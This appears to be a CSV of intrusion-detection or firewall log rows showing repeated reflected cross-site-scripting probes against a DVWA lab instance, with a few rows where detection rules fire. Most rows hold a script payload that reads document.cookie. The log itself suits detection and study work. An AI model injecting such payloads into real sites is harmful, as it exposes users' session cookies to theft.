ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VD7FLSRMX5JC7K8P8MNGEWSB5AA40QYMF6RS3B9CAN6OMKKAXD');console.log(document.cookie);</script>&user_token=639190367ee3db5c27e8a550b139ae00
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CDH3TTUN8ZA3UEUBQ1O7E31HSP9MR6O15H1QHCJQK5TQN40D3O');console.log(document.cookie);</script>&user_token=c0b1f5fece0c4282784d77c9a4e8af9f
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('ESBJWNGG2ZHEFUOCU7JM7FNXCSXYIXKRZC52YBC9O83Q2U9PS8');console.log(document.cookie);</script>&user_token=2ff2e0f8ad1ec6404cf32298ed5fe629
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('HO5V89RTWHJ3YY20WBXVZPERTHKH9EF168XJCJAOZ78E930UPT');console.log(document.cookie);</script>&user_token=060a2f7d7f3fec547d3924f5b401308f
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('D7QZSGEROPI7ZIIZ01OKKVDJ1998T5YOYLU6N8G1IXHDM9TB63');console.log(document.cookie);</script>&user_token=c949a5c56341fed149f21168e32591a8
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('9Y0EFL5L40KI5BK8XJUCWAW8K99W62OYGE1C9JXCDDQZVEXX3E');console.log(document.cookie);</script>&user_token=052d615eb275e2540adc0ac13aafd7f9
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('1W60HUYQ15ETN1F8DK2MJ6K2Z8ZDU0U7NLLBSIMZPHW9D1BCMJ');console.log(document.cookie);</script>&user_token=b6a16f8c59918683956f723afb8b014f
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('9J6QMIL5NW8ALRTQ6LBRBCMTG64OEJETJ7N9VI913RIPCPKUHS');console.log(document.cookie);</script>&user_token=f4a4e79c64c4f57eab20f0504c68f3f9
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('Q4J0UDAX8RWLAGMH54FFX0NTVAQMYCHJP3OPCSV8C4TLDU2F6J');console.log(document.cookie);</script>&user_token=428006c89f9f34a9f4425a907532a2a5
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BQD8KR6LPAUP77BQCB11P0QKQFLMYE0D342ASU41BTCF3EAXPD');console.log(document.cookie);</script>&user_token=0a8ef4f8e490bcc6eacb6aaca6d79e4e
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8W0HDWR9QQB6ZKFIKDW4C3HGWVG7WB74W4GBAQD0FO8S5HO0UV');console.log(document.cookie);</script>&user_token=082572081ce657a592db1d44465fc976
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3HUDTG4LDL2W4QE5142FB4ZPPCOE5T2DMCF3DF2QFNWWZVH8FS');console.log(document.cookie);</script>&user_token=5df18d2103a9c3ae6524d34b75dc49c8
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BLJ8W8VW5FFHR5EZ2MVR60H9EFTJ7CENFWBKMDSP5ERYIBHTGF');console.log(document.cookie);</script>&user_token=3f26209e530fb1a5a2d524ee50c45328
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('GWX88VRLI8Y3HE5D02IZE9AKINVALZCA20IP64K08TX1556IY0');console.log(document.cookie);</script>&user_token=da689217be7d55d62252e806173ff0c0
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('R1NXFENAH3X52I01P79YITAC8HXDJSAGH5YFED18QW7ZH036CM');console.log(document.cookie);</script>&user_token=5eb87dbbebf8e5c54e006d86c2541b63
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BDHKDPDA4FKCSUB0JQRVAJUVG9I730RCF9BVWFXC5HC08VV4LI');console.log(document.cookie);</script>&user_token=df14a45a5d7963a2199345cf1aa2ca73
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4Y55BQ086RLZP5RMPK27ST19DF2SP4J071WBB2IQU6OBIJ9SF1');console.log(document.cookie);</script>&user_token=5488658dfe94fcf6c6c8f35282d4bc46
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('YND2WQ2NLNJU0VW2AJNOK7W16OQHEZ6BI893U77QI1W66J9W32');console.log(document.cookie);</script>&user_token=cbd908e14534163c385e1c74ae25681d
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('38QKSTGV9Y3909BBEUEBF06LH6JGMZI4FOGLH2J1S58BW1SM0F');console.log(document.cookie);</script>&user_token=6aaf5819124f06994bbd1b214d1f0198
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('YPKRFPYGVK5YK44QF1Y83FH37OCA7R51SDCD5O7AR6UVY2RQQD');console.log(document.cookie);</script>&user_token=8b750468a872d9b5d0021550fe1b0b33
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('YSU0JEIMCF60E3BV963YD57OYUHDKUL2BI89HN3LDU8THW4RJT');console.log(document.cookie);</script>&user_token=83c2e8d5867b1e76f8bf5b599b9ca12e
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('H0D1IN81OHZAD5DABWLZG7Z1Y4LBQOWRW2M5VPJSTRZCBUM1BE');console.log(document.cookie);</script>&user_token=b8261ac72565bb85e5cafa7583e1b154
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('MSX9BH6P3MB8CKPMPQHA3B9KC4CFBIRSC6KVMMYZDD8AN7G5PM');console.log(document.cookie);</script>&user_token=810d5aa07400716d3f0eeb7cd668aa52
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4PZKNVDJ6070ROZ5ORM2GNR1SR8GSD83ZI8RVWVXDBHFY4CEWW');console.log(document.cookie);</script>&user_token=cfe9018c33d70c37ea95fa887e20c845
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('K3FEAZQYLPPV5E5MVY4HLMDY19S7AC7CT5FFUUSWFUL0NJDCYF');console.log(document.cookie);</script>&user_token=f734fb5a78b24eefd0bfbe11407a5285
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('RBSCQGES1JR0SY4BKTNHOQTRQN7NIX0DUFAYKTW501FB1UTERV');console.log(document.cookie);</script>&user_token=b101909181e0234b119c5039af6f7325
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XVIRCVR7KTXCOA8DSQDEBUXF78L67UPXU4IPSDKANWCQAE85U5');console.log(document.cookie);</script>&user_token=ca2f9a5cc19102152c1a4902e00ae150
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
14984,777129,3,1,Suspicious HTTP Evasion Found,spyware,tcp,18.218.115.60,172.31.69.28,spyware,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WAZQHFUWWVLV4ATEBKZMSLRWEBFI92RDLF6XOQ6QM3PQWNPAEI');console.log(document.cookie);</script>&user_token=eaa6b7c759e3c5de523b92459652e8c4
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('N37T8XCNVJQU0S58B24QNEUYES5RXE1QH9A33QKZ1WU9GSFH8V');console.log(document.cookie);</script>&user_token=e27d25d50560b88a6cf1748ef76766a7
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('JDQBE1YGBV6UUXD3T4A6V873W15TTLPFRT5MPJVYZJ9BV2PWQE');console.log(document.cookie);</script>&user_token=a9b6c3fbb0a67d53ead8cefa23947f29
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('KOPLVOLI706Q90U2YHXC2CVPR0C4BZPCO5XOL4M6CDI0ZZY15W');console.log(document.cookie);</script>&user_token=1e25471797d5b1132bf1d22de8a90460
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XESN820A01IOM1ERI9E1DW003T8O9FVFNXSNNLOK36WEYZRI99');console.log(document.cookie);</script>&user_token=f3273ac2a09ccdfb9380d5a1320b5da5
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('49Y205WTV2L0L3JPCW8FZQWJT14DJKYTFXIR7CW5MLISPRSUOI');console.log(document.cookie);</script>&user_token=83b5228adf043f1ffc284f92920ba732
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('LYUMB7G4QRK0ET55F410W1R5Z4O69EV4JSVUUU8RX9UH80LOB1');console.log(document.cookie);</script>&user_token=7007a0911217533a0ac892a97b4d90bf
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('0F5VAIETNXF7UANXM0VHR35NE6GPO223V0O4AIBGAING11CY9A');console.log(document.cookie);</script>&user_token=5bfe5642ba4a7e97a31d406bd3a5329c
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UFCRI9V4G353EHFRGMYZGJK8AU0BAZAV9SW5MP06ZKKRO10RVA');console.log(document.cookie);</script>&user_token=a8279763918e366fb8e13cb24129a8f3
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('AKRX68DOR6F2OB8IJR7OOT1NDTTJ4SG70PGPILW152MN2Q9HVH');console.log(document.cookie);</script>&user_token=164b2ce1fb1b736e6c0bf354003da3bc
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('Z68JGYNRNS9HBYAAEOIBAOTFIBLO7DCC8NHJNPDROK62G6SWBN');console.log(document.cookie);</script>&user_token=ea355641a62db4b370cbf6cb03d52a9c
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('TIR2IQI9HZ7T07OJM8KPJA6Q5IQODYERBDXI98P38KI2X7O0N6');console.log(document.cookie);</script>&user_token=cf49d8e2627dcc01bc9f3e4377c21dd0
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VNS929HUMZ1RGWXO4VHPGYNRY6UNYEDNJV2EAB8L92OU3NXJ16');console.log(document.cookie);</script>&user_token=0e26c35f25f6211629ad089954ea791f
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WTXIVB2HDHNH1V8N6V7I75BDTPCUH51WBAACLFUKGHIQ5VI62Z');console.log(document.cookie);</script>&user_token=2f8b4cb89152b2983ce8fb01890ab9d0
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('EOD5583NE7522S8ME6ZJBQ5KO020BR17NXK7G6ZSKV82636208');console.log(document.cookie);</script>&user_token=5eb58af32df190804b20e92a7f749c65
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WRJLOJSFDF15VUGY6SI345AXYIJZ8QLCJEC54CQ5IC3DJEY143');console.log(document.cookie);</script>&user_token=aed7872a23278f85f9000a7c08c12a5f
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('OA7P3Q95V5DX5U5Z3P3N7V30DJAGP4AYG53JRYD5394Z6AQD02');console.log(document.cookie);</script>&user_token=8bb3c77f01c839eb14f1d377c6827433
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XQPXBODZPB453DI7GDC45LBAPSKU6TAHOKZPECPCN8P3FFTQCR');console.log(document.cookie);</script>&user_token=8eefa04c18807b8396f2628903405c8b
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('OAWVTKU40MCOUCF6H6QR9MTQ6957UDSREUKQGIOV8E0IZH093O');console.log(document.cookie);</script>&user_token=de8f5d832089a20259e6eda6677933d3
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XKQI65FE5WJAVIX0Q1BYI05VZIMJS2HGJHVJXMS592PNM33Z6I');console.log(document.cookie);</script>&user_token=8378dbd25fcce2f49affa9a89393adb8
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('2GCEA62WEYYLZRJEU6JC8H0WPHT6S1SJYEU9FR3544U5ZV0GUQ');console.log(document.cookie);</script>&user_token=c6597d5e9b5ac6e02b68938bb47865f0
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VWA5UXFGH8X7H483DKKSCBYTVB8HDZSYVCME3DNBNQGL3IEKR6');console.log(document.cookie);</script>&user_token=8203a796c0382f3b6c77f8824ede5982
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VQEEXORX4CWFFV9XLZTJYCWK9JXD115VK95E19JAXYW9YDMI9T');console.log(document.cookie);</script>&user_token=d990d45ca258fbc44f0d3c8f0920e0ec
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('0TFJZGSZT8E29Q6Y0E44WSQKP2G08RYG4PY5QDOM8A14R05Y3S');console.log(document.cookie);</script>&user_token=9a58e7b502b6e0d4c31061b8edc2a6ae
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('RJ0EWLYMY4HEUDXUANFVZFV9XIQ5LPTDCGIGY0O1V54DYXBV6I');console.log(document.cookie);</script>&user_token=eec194bc315ed9f5bcf9b81a9689d022
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('28UIGZKQH4SN5SXG2EHQ9QYTHBIQ1JWA1GO6HSFKE7FF3UUXFG');console.log(document.cookie);</script>&user_token=15e2873cf70a74225a8e6ce59cd88829
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
55310,777129,150,3,DVWA Web Application Attack Detection,code-execution,tcp,18.218.115.60,172.31.69.28,vulnerability,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3GZWP3D727W5R21DSJPYQ1KM11BAST5EQKFNN6T86WAJ2IXIH6');console.log(document.cookie);</script>&user_token=c68fe7db71cf2441ea1a68c83e45ca59
94328,777129,150,3,Generic Cross-Site Scripting Vulnerability,code-execution,tcp,18.218.115.60,172.31.69.28,vulnerability,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3GZWP3D727W5R21DSJPYQ1KM11BAST5EQKFNN6T86WAJ2IXIH6');console.log(document.cookie);</script>&user_token=c68fe7db71cf2441ea1a68c83e45ca59
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('N8PRBBOYCRVQTL3SUSJX5FBPMJ3AX3M0X2KPEK3DOB2JYLOUKP');console.log(document.cookie);</script>&user_token=32cfe6a90de94e207e6a248ab7b96e96
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BXOB51P6ZGTN04T4KJQUTN3711XZX4Y32PMNWK9TUUTP67A175');console.log(document.cookie);</script>&user_token=f38653a6a2ecab6dddf2555e33fc5cbd
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('FKCTTZ55MFXMZ6MJNTFIWG02NX74W9AB4OJVJHPEQYJH24R8GS');console.log(document.cookie);</script>&user_token=09c00f0ca0c4d83296ff12ded3589740
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('IX8W32KBASU5VW319PTN5JF8ZCI7XBW8EJL0A7VZTTBJNQ3UDA');console.log(document.cookie);</script>&user_token=fc367232da63f6a05ac7fcd6157e45e6
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3ETL48AHAKLR6P3U0FAKV27FST4CTOVQPRRQXRFSVKRILS8D0T');console.log(document.cookie);</script>&user_token=328862f0e6ff8147c1b7a3e7515cc1e6
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('0DC7XQ14BPQZB6E4SMNXQ86SBK2C2R35I8JXLYZYY0VWPI8P47');console.log(document.cookie);</script>&user_token=b9cf06ebb7cd8d4a5aa3067e654b4906
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('EN4PMA2EPWHKF76HFPDM7F9GI2GWM17ODURX2CFRD2QA7MYLN6');console.log(document.cookie);</script>&user_token=3d134deaa21052f428cd0016931533b1
9999,776298,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
